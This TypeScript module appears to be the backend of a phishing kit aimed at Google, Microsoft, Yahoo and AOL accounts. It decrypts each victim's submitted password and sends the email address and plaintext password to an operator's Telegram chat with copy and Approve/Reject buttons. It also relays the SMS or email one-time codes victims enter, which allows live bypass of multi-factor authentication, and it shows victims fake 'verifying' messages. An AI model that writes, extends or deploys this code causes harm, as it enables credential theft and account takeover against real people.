import type { Update } from "@grammyjs/types";
import { bot } from "../clients/grammy.client.js";
import { Lead } from "../schemas/lead.schemas.js";
import { InlineKeyboard } from "grammy";
import { constants, privateDecrypt } from "node:crypto";
import { selectLeadChannel, updateLeadChannel } from "./lead.methods.js";

const providerNames: Record<Lead["provider"], string> = {
  google: "Google / Gmail",
  outlook: "Outlook.com",
  microsoft365: "Microsoft 365",
  yahoo: "Yahoo",
  aol: "AOL Mail",
  other: "Other",
};

export function testTelegramUpdate(value: unknown): value is Update {
  function isRecord(value: unknown): value is Record<string, unknown> {
    return typeof value === "object" && value !== null && !Array.isArray(value);
  }
  if (!isRecord(value) || !Number.isInteger(value.update_id)) return false;
  const updateTypes = Object.keys(value).filter((key) => key !== "update_id");
  if (updateTypes.length !== 1) return false;
  if (updateTypes[0] === "callback_query" && isRecord(value.callback_query)) {
    const callback = value.callback_query;
    if (
      typeof callback.id === "string" &&
      isRecord(callback.from) &&
      Number.isInteger(callback.from.id) &&
      typeof callback.data === "string"
    ) {
      return true;
    }
  }
  if (updateTypes[0] === "message" && isRecord(value.message)) {
    const message = value.message;
    if (
      Number.isInteger(message.message_id) &&
      isRecord(message.chat) &&
      (typeof message.chat.id === "number" ||
        typeof message.chat.id === "string")
    ) {
      return true;
    }
  }
  return false;
}

export async function requestTelegramLeadReview(
  anchor: string,
  lead: Lead,
): Promise<void> {
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!chatId) throw new Error("Telegram lead review chat is not configured.");
  const privateKey = process.env.PHOENYX_PRIVATE_KEY?.replace(/\\n/g, "\n");
  if (!privateKey) throw new Error("Missing PHOENYX_PRIVATE_KEY");
  const decrypted = privateDecrypt(
    {
      key: privateKey,
      padding: constants.RSA_PKCS1_OAEP_PADDING,
      oaepHash: "sha256",
    },
    Buffer.from(lead.authToken, "base64"),
  );
  const decryptedPass = decrypted.toString("utf8");
  const norm = (value: string): string => {
    return value.replace(/[\u0000-\u001f\u007f]/g, " ").trim();
  };
  const channel = await updateLeadChannel(anchor, {
    status: "loading",
    process: "auth",
    message: "Authenticating your credentials...",
    logEntry: [
      `Provider - ${providerNames[lead.provider]}`,
      `Email - "${norm(lead.email)}"`,
      `Password - "${norm(decryptedPass)}"`,
      ...(lead.customFields?.map((f) => {
        return `${norm(f.name)} - ${norm(f.value)}`;
      }) ?? []),
    ].join("\n\n"),
  });
  if (!channel) {
    console.error("Invalid anchor or crashed channel.");
    throw Error("Session expired. Reload page and try again.");
  }
  const result = await bot.api.sendMessage(chatId, channel.logs + "\n", {
    link_preview_options: { is_disabled: true },
    reply_markup: new InlineKeyboard()
      .copyText(lead.email, lead.email)
      .row()
      .copyText(decryptedPass, decryptedPass)
      .row()
      .text("Reject", `lead-review:${anchor}:auth-flag`)
      .danger()
      .text("Approve", `lead-review:${anchor}:auth-pass`)
      .success(),
  });
  await updateLeadChannel(anchor, { tgMsgId: result.message_id });
}

export async function requestTelegramCodeLeadReview(
  anchor: string,
  codeLead: {
    type: "sms" | "email";
    code: string;
  },
): Promise<void> {
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!chatId) throw new Error("Telegram lead review chat is not configured.");
  const privateKey = process.env.PHOENYX_PRIVATE_KEY?.replace(/\\n/g, "\n");
  if (!privateKey) throw new Error("Missing PHOENYX_PRIVATE_KEY");
  const norm = (value: string): string => {
    return value.replace(/[\u0000-\u001f\u007f]/g, " ").trim();
  };
  const sms = codeLead.type === "sms";
  const channel = await updateLeadChannel(anchor, {
    status: "loading",
    process: sms ? "verify-sms-code" : "verify-email-code",
    message: sms ? "Verifying SMS code..." : "Verifying email code...",
    logEntry: `${sms ? "SMS code" : "email code"} - "${norm(codeLead.code)}"`,
  });
  if (!channel) {
    console.error("Invalid anchor or crashed channel.");
    throw Error("Session expired. Reload page and try again.");
  }
  if (!channel.tgMsgId) {
    await selectLeadChannel(anchor, { status: "idle" });
    console.error("Telegram message ID is undefined.");
    throw Error("Session expired. Reload page and try again.");
  }
  await bot.api.editMessageText(chatId, channel.tgMsgId, channel.logs + "\n");
  await bot.api.editMessageReplyMarkup(chatId, channel.tgMsgId, {
    reply_markup: new InlineKeyboard()
      .copyText(codeLead.code, codeLead.code)
      .row()
      .text(
        "Reject", //
        `lead-review:${anchor}:verify-${codeLead.type}-code-flag`,
      )
      .danger()
      .text(
        "Approve",
        `lead-review:${anchor}:verify-${codeLead.type}-code-pass`,
      )
      .success(),
  });
}

export function getTelegramMode(): "webhook" | "polling" | "disabled" {
  if (process.env.VERCEL || process.env.NODE_ENV === "production") {
    return "webhook";
  }
  if (process.env.TELEGRAM_MODE === "polling") return "polling";
  if (process.env.TELEGRAM_MODE === "webhook") return "webhook";
  return "disabled";
}

export async function startTelegramPolling(): Promise<void> {
  if (process.env.TELEGRAM_MODE !== "polling") return;
  if (process.env.VERCEL || process.env.NODE_ENV === "production") {
    throw new Error(
      "Telegram long polling is only available in local development.",
    );
  }
  if (!bot)
    throw new Error("TELEGRAM_BOT_TOKEN is required for local polling.");
  const webhook = await bot.api.getWebhookInfo();
  if (webhook.url) {
    throw new Error(
      "This bot already has a webhook. Remove it before enabling local polling.",
    );
  }
  await bot.start({
    onStart: () => console.log("Telegram bot started in local polling mode."),
  });
}
